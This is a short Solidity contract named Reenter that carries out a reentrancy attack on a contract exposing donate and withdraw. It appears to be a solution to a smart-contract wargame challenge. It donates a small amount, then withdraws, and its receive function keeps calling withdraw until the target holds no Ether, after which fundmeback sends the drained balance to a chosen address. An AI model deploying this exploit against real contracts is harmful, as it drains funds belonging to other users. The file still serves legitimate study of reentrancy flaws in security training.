// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address) external payable;

    function withdraw(uint256) external;
}

contract Reenter {
    address public reentranceAddress;

    constructor(address _contractAddress) payable {
        reentranceAddress = _contractAddress;
    }

    function donate(address _to) external payable {
        IReentrance(reentranceAddress).donate{value: msg.value}(_to);
    }

    function withdraw() external {
        IReentrance(reentranceAddress).withdraw(0.001 ether);
    }

    function getBalance(address _who) public view returns (uint256) {
        return address(_who).balance;
    }

    function fundmeback(address payable _to) external payable {
        require(_to.send(address(this).balance), "could not send Ether");
    }

    receive() external payable {
        if (getBalance(reentranceAddress) != 0) {
            IReentrance(reentranceAddress).withdraw(msg.value);
        }
    }
}